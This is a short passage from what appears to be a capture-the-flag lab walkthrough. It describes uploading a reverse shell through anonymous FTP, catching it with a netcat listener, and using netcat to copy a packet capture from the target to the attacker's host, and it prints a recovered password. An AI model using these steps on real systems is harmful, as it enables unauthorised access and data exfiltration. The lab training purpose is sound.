Directories:

/files has an /ftp directory, and with anon access, we can upload a reverse shell via ftp

We will listen for the shells connection with `nc -lvnp 1234`

Upon connection and running `whoami` we can see that we are under the `www-data` user. Running `ls` in the directory that we are in upon connection shows a `recipe.txt` and running `cat recipe.txt` shows us what the "secret ingredent" is.

Target machine: `nc -w 3 10.13.41.239 8888 < suspicious.pcapng`
My machine `nc -lp 8888 > suspicious.pcapng`

Following the tcpstream shows us a password of c4ntg3t3n0ughsp1c3
